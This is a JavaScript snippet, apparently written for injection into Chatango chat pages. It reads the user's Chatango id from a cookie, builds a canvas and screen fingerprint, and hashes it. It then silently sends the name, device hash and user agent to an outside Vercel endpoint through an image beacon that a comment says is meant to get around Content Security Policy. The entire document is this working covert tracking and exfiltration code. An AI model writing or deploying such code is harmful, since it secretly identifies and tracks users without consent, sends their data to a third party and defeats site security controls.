(async function main(){
  if (!document.body || !window.crypto || !crypto.subtle) {
    setTimeout(main, 300);
    return;
  }

  function getUser(){
    let f=document.cookie.match(/id\.chatango\.com=([^;]+)/);
    return f ? f[1] : "Anon";
  }

  function canvasFP(){
    try{
      const c=document.createElement("canvas");
      const x=c.getContext("2d");
      x.fillText("fp",2,2);
      return c.toDataURL();
    }catch(e){
      return "nocanvas";
    }
  }

  async function hash(str){
    const buf=new TextEncoder().encode(str);
    const h=await crypto.subtle.digest("SHA-256",buf);
    return [...new Uint8Array(h)]
      .map(b=>b.toString(16).padStart(2,"0"))
      .join("");
  }

  const raw =
    navigator.userAgent +
    screen.width +
    screen.height +
    canvasFP();

  const deviceID = await hash(raw);

  const payload = encodeURIComponent(JSON.stringify({
    name: getUser(),
    id: deviceID,
    ua: navigator.userAgent
  }));

  // === IMG BEACON (ANTI CSP) ===
  const img = new Image();
  img.src = "https://device-check-phi.vercel.app/api/check?d=" + payload;

})();
